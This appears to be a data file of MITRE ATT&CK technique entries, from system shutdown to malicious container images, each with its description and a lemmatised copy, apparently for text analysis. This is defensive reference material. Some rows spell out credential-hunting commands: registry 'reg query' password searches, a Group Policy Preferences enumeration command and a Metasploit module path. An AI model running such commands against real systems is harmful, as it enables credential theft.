T1529,System Shutdown/Reboot,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. reload).Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",adversary shutdown reboot system interrupt access aid destruction system operate system contain command initiate shutdown reboot machine network device case command initiate shutdown reboot remote computer network device network device cli reboot system disrupt access computer resource legitimate user impede incident response recovery adversary attempt shutdown reboot system impact way disk structure wipe inhibit system recovery hasten intended effect system availability
T1124,System Time Discovery,"An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. System time information may be gathered in a number of ways, such as with Net on Windows by performing net time \hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.On network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration.This information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job",adversary gather system time time zone local remote system system time set store windows time service domain maintain time synchronization system service enterprise network system time information gather number way net windows perform net time gather system time remote system victim time zone infer current system time gather network device network device cli command clock detail current time configuration information useful perform technique execute file schedule task job
T1080,Taint Shared Content,"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",adversary deliver payload remote system add content share storage location network drive internal code repository content store network drive share location taint add malicious program script exploit code valid file user open share tainted content malicious portion execute run adversary code remote system adversary use tainted share content laterally directory share pivot variation technique use technique propagate malware user access share network directory use shortcut modification directory file use masquerading look like real directory hide hidden files directory malicious base directory embed command execute hide malware file directory open real intend directory user expect action occur frequently network directory technique result frequent reinfection broad access system potentially new high privileged account adversary compromise share network directory binary infection append prepende code healthy binary share network directory malware modify original entry point oep healthy binary ensure execute legitimate code infection continue spread newly infect file execute remote system infection target binary non binary format end extension include limit
T1221,Template Injection,"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.Adversaries may also modify the *\template control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.",adversary create modify reference user document template conceal malicious code force authentication attempt example microsoft office open xml ooxml specification define xml base format office document xlsx replace old binary format ooxml file pack zip archive compromise xml file refer part contain property collectively define document render property part reference share public resource access online url example template property reference file serve pre formatted document blueprint fetch document load adversary abuse template initially conceal malicious code execute user document template reference inject document enable malicious payload fetch execute document load adversary modify control word file similarly conceal download malicious code legitimate control word value intend file destination template file resource retrieve load file open adversary alter byte exist file insert template control word field include url resource malicious payload technique enable forced authentication inject smb https credential prompting url trigger authentication attempt
T1205,Traffic Signaling,"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet. Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities. Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives. To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.",adversary use traffic signaling hide open port malicious functionality persistence command control traffic signaling involve use magic value sequence send system trigger special response open closed port execute malicious task form send series packet certain characteristic port open adversary use command control usually series packet consist attempt connection predefine sequence close port port knocking involve unusual flag specific string unique characteristic sequence complete open port accomplish host base firewall implement custom software adversary communicate open port service listen port respond command trigger malicious functionality pass appropriate magic observation signal packet trigger communication conduct different method mean originally implement use libpcap library sniff packet question method leverage raw socket enable malware use port open use program network device adversary use craft packet enable network device authentication standard service offer device telnet signaling open closed service port telnet trigger module modification malware implant device add remove change malicious capability adversary use craft packet attempt connect open closed port attempt connect router interface broadcast network address ip port order achieve goal objective enable traffic signaling embed device adversary achieve leverage patch system image monolithic nature architecture adversary use wake lan feature turn power system wake lan hardware feature allow power system power wake send magic packet system power target lateral movement
T1205.001,Traffic Signaling: Port Knocking,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",adversary use port knocking hide open port persistence command control enable port adversary send series attempt connection predefine sequence close port sequence complete open port accomplish host base firewall implement custom software technique observe dynamic opening listen port initiating connection listen server different system observation signal packet trigger communication conduct different method mean originally implement use libpcap library sniff packet question method leverage raw socket enable malware use port open use program
T1205.002,Traffic Signaling: Socket Filters,"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the libpcap library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.Filters can be installed on any Unix-like platform with libpcap installed or on Windows hosts using Winpcap. Adversaries may use either libpcap with pcap_setfilter or the standard library function setsockopt with SO_ATTACH_FILTER options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",adversary attach filter network socket monitor activate backdoor persistence command control elevated permission adversary use feature libpcap library open socket install filter allow disallow certain type datum come socket filter apply traffic pass specify network interface interface specify network interface receive packet match filter criterion additional action trigger host activation reverse shell establish connection adversary send craft packet target host match instal filter criterion filter instal unix like platform libpcap instal windows host winpcap adversary use libpcap standard library function setsockopt option socket connection active packet receive behavior difficult detect lack activity host low cpu overhead limited visibility raw socket usage
T1537,Transfer Data to Cloud Account,"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.",adversary exfiltrate datum transfer datum include backup cloud environment cloud account control service avoid typical file transfer download network base exfiltration detection defender monitor large transfer outside cloud environment normal file transfer command control channel watch datum transfer account cloud provider transfer utilize exist cloud provider api internal address space cloud provider blend normal traffic avoid datum transfer external network interface incident observe adversary create backup cloud instance transfer separate account
T1127,Trusted Developer Utilities Proxy Execution,"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",adversary advantage trust developer utility proxy execution malicious payload utility software development relate task execute code form assist development debugging reverse engineering utility sign legitimate certificate allow execute system proxy execution malicious code trusted process effectively bypass application control solution
T1127.001,Trusted Developer Utilities Proxy Execution: MSBuild,Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.,adversary use msbuild proxy execution code trust windows utility microsoft build engine software build platform visual studio handle xml format project file define requirement load build platform configuration adversary abuse msbuild proxy execution malicious code inline task capability msbuild introduce version allow c visual basic code insert xml project file
T1199,Trusted Relationship,"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.",adversary breach leverage organization access intend victim access trust party relationship abuse exist connection protect receive scrutiny standard mechanism gain access network organization grant elevate access second party external provider order allow manage internal system cloud base environment example relationship include service contractor manage security provider infrastructure contractor hvac elevator physical security party provider access intend limit infrastructure maintain exist network rest enterprise valid accounts party access internal network system compromise office environment organization grant microsoft partner reseller delegate administrator permission compromise partner reseller account adversary able leverage exist delegate administrator relationship send new delegate administrator offer client order gain administrative control victim tenant
T1552,Unsecured Credentials,"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. Private Keys).",adversary search compromised system find obtain insecurely store credential credential store misplace location system include plaintext file bash history operate system application specific repository credential registry specialized file artifact private keys
T1552.001,Unsecured Credentials: Credentials In Files,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.",adversary search local file system remote file share file contain insecurely store credential file create user store credential share credential store group individual configuration file contain password system service source code binary file contain embed password possible extract password backup save virtual machine os credential dumping cloud containerized environment authenticated user service account credential store local configuration credential file
T1552.002,Unsecured Credentials: Credentials in Registry,Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information: Local Machine Hive: reg query HKLM /f password /t REG_SZ /s Current User Hive: reg query HKCU /f password /t REG_SZ /s,adversary search registry compromise system insecurely store credential windows registry store configuration information system program adversary query registry look credential password store use program service credential automatic logon example command find registry key relate password information local machine hive reg query hklm password current user hive reg query hkcu password
T1552.003,Unsecured Credentials: Bash History,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.",adversary search bash command history compromised system insecurely store credential bash keep track command user type command line history utility user log history flush user file user file reside location typically file keep track user command user type username password command line parameter program save file log adversary abuse look file potential credential
T1552.004,Unsecured Credentials: Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:\Users\(username)\.ssh\ on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.When a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device’s identity.On network devices, private keys may be exported via Network Device CLI commands such as crypto pki export. Some private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",adversary search private key certificate file compromised system insecurely store credential private cryptographic key certificate authentication encryption decryption digital signature common key certificate file extension include adversary look common key directory ssh key nix base system windows adversary tool search compromised system file extension relate cryptographic key certificate device register azure ad device key transport key generate verify device identity network device private key export network device cli command crypto pki export private key require password passphrase operation adversary use input capture keylogging attempt brute force passphrase line private key authenticate remote service like ssh use decrypt collect file email
T1552.005,Unsecured Credentials: Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.The de facto standard across cloud service providers is to host the Instance Metadata API at http//169.254.169.254.",adversary attempt access cloud instance metadata api collect credential sensitive datum cloud service provider support cloud instance metadata api service provide run virtual instance allow application access information run virtual instance available information generally include security group additional metadata include sensitive datum credential userdata script contain additional secret instance metadata api provide convenience assist manage application accessible access instance adversary presence run virtual instance query instance metadata api directly identify credential grant access additional resource additionally adversary exploit server request forgery ssrf vulnerability public face web proxy allow gain access sensitive information request instance metadata de facto standard cloud service provider host instance metadata api
T1552.006,Unsecured Credentials: Group Policy Preferences,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:Metasploit’s post exploitation module: post/windows/gather/credentials/gpp Get-GPPPassword gpprefdecrypt.pyOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml",adversary attempt find unsecured credential group policy preferences gpp gpp tool allow administrator create domain policy embed credential policy allow administrator set local account group policy store sysvol domain controller mean domain user view sysvol share decrypt password aes key following tool script gather decrypt password file group policy preference xml file metasploit post exploitation module post window gather credential gpp gpppassword sysvol share adversary use following command enumerate potential gpp xml file dir
T1552.007,Unsecured Credentials: Container API,"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment. An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.",adversary gather credential api container environment api environment docker api kubernetes api allow user remotely manage container resource cluster component adversary access docker api collect log contain credential cloud container resource environment adversary sufficient permission pod service account use kubernetes api retrieve credential kubernetes api server credential include need docker api authentication secret kubernetes cluster component
T1552.008,Unsecured Credentials: Chat Messages,"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.Rather than accessing the stored chat logs (i.e., Credentials In Files), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation .",adversary directly collect unsecured credential store pass user communication service credential send store user chat communication application email chat service like slack teams collaboration tool like jira trello service support user communication user share form credential username password api key authentication token private public corporate internal communication channel access store chat log credential file adversary directly access credential service user endpoint server host service administrator portal cloud host service adversary compromise integration tool like slack workflows automatically search message extract user credential credential abuse perform follow activity lateral movement privilege escalation
T1535,Unused/Unsupported Cloud Regions,"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used.",adversary create cloud instance unused geographic service region order evade detection access usually obtain compromise account manage cloud infrastructure cloud service provider provide infrastructure world order improve performance provide redundancy allow customer meet compliance requirement oftentimes customer use subset available region actively monitor region adversary create resource unused region able operate undetected variation behavior take advantage difference functionality cloud region adversary utilize region support advanced detection service order avoid detection activity example adversary use unused aws region cryptocurrency resource hijacking cost organization substantial amount money time depend processing power
T1550,Use Alternate Authentication Material,"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",adversary use alternate authentication material password hash kerberos ticket application access token order laterally environment bypass normal system access control authentication process generally require valid identity username authentication factor password pin physical smart card token generator etc alternate authentication material legitimately generate system user application successfully authenticate provide valid identity require authentication alternate authentication material generate identity creation process cache alternate authentication material allow system verify identity successfully authenticate ask user reenter authentication alternate authentication maintain system memory disk risk steal credential access technique steal alternate authentication material adversary able bypass system access control authenticate system know plaintext password additional authentication factor
T1550.001,Use Alternate Authentication Material: Application Access Token,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the sts:GetFederationToken API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated. Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",adversary use steal application access token bypass typical authentication process access restricted account information service remote system token typically steal user service lieu login credential application access token authorized api request behalf user service commonly access resource cloud container base application software service saas oauth commonly implement framework issue token user access system framework collaboratively verify user determine action user allow perform identity establish token allow action authorize pass actual credential user compromise token grant adversary access resource site malicious application example cloud base email service oauth access token grant malicious application potentially gain long term access feature user account refresh token enable background access award compromised access token initial step compromise service example token grant access victim primary email adversary able extend access service target subscribe trigger forget password routine aws gcp environment adversary trigger request short live access token privilege user account direct api access token negate effectiveness second authentication factor immune intuitive countermeasure like change password example aws environment adversary compromise user aws api credential able use sts getfederationtoken api create federated user session permission original user persist original user credential deactivate additionally access abuse api channel difficult detect service provider end access align legitimate workflow
T1550.002,Use Alternate Authentication Material: Pass the Hash,"Adversaries may ""pass the hash"" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.When performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.",adversary pass hash steal password hash laterally environment bypass normal system access control pass hash pth method authenticate user have access user cleartext password method bypass standard authentication step require cleartext password move directly portion authentication use password hash perform pth valid password hash account capture credential access technique captured hash pth authenticate user authenticate pth perform action local remote system adversary use steal password hash overpass hash similar pth involve password hash authenticate user use password hash create valid kerberos ticket ticket perform pass ticket attack
T1550.003,Use Alternate Authentication Material: Pass the Ticket,"Adversaries may ""pass the ticket"" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.When preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.A Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).A Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.",adversary pass ticket steal kerberos ticket laterally environment bypass normal system access control pass ticket ptt method authenticate system kerberos ticket have access account password kerberos authentication step lateral movement remote system preform ptt valid kerberos ticket valid accounts capture os credential dumping user service ticket ticket grant ticket tgt obtain depend level access service ticket allow access particular resource tgt request service ticket ticket granting service tgs access resource user privilege access silver ticket obtain service use kerberos authentication mechanism generate ticket access particular resource system host resource golden ticket obtain domain key distribution service account krbtgt account ntlm hash enable generation tgt account active directory adversary create valid kerberos ticket user information steal password hash aes key example overpasse hash involve ntlm password hash authenticate user pass hash password hash create valid kerberos ticket
T1550.004,Use Alternate Authentication Material: Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.",adversary use steal session cookie authenticate web application service technique bypass multi factor authentication protocol session authenticate authentication cookie commonly web application include cloud base service user authenticate service credential pass authentication need occur frequently cookie valid extended period time web application actively cookie obtain steal web session cookie web cookies adversary import cookie browser control able use site application user long session cookie active log site adversary access sensitive information read email perform action victim account permission perform example malware target session cookie bypass multi factor authentication system
T1204,User Execution,"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of Phishing.While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.Adversaries may also deceive users into performing actions such as enabling Remote Access Software, allowing direct control of the system to the adversary, or downloading and executing malware for User Execution. For example, tech support scams can be facilitated through Phishing, vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or Remote Access Software.",adversary rely specific action user order gain execution user subject social engineering execute malicious code example open malicious document file link user action typically observe follow behavior form phishing user execution frequently occur shortly initial access occur phase intrusion adversary place file share directory user desktop hope user click activity see shortly internal spearphishing adversary deceive user perform action enable remote access software allow direct control system adversary download execute malware user execution example tech support scam facilitate phishing vishing form user interaction adversary use combination method spoof promote toll free number center direct victim malicious website deliver execute payload contain malware remote access software
T1204.001,User Execution: Malicious Link,An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.,adversary rely user click malicious link order gain execution user subject social engineering click link lead code execution user action typically observe follow behavior spearphishing link click link lead execution technique exploitation browser application vulnerability exploitation client execution link lead user download file require execution malicious file
T1204.002,User Execution: Malicious File,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.Adversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. While Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",adversary rely user open malicious file order gain execution user subject social engineering open file lead code execution user action typically observe follow behavior spearphishing attachment adversary use type file require user execute include adversary employ form masquerade obfuscate file information increase likelihood user open successfully execute malicious file method include familiar naming convention password protect file supply instruction user open malicious file frequently occur shortly initial access occur phase intrusion adversary place file share directory user desktop hope user click activity see shortly internal spearphishing
T1204.003,User Execution: Malicious Image,"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via Upload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: Match Legitimate Name or Location).",adversary rely user run malicious image facilitate execution amazon web services aws amazon machine images amis google cloud platform gcp images azure images popular container runtime docker backdoore backdoore image upload public repository upload malware user download deploy instance container image realize image malicious bypass technique specifically achieve initial access lead execution malicious code code execute cryptocurrency mining instance container adversary image certain way increase chance user mistakenly deploy instance container image ex match legitimate location
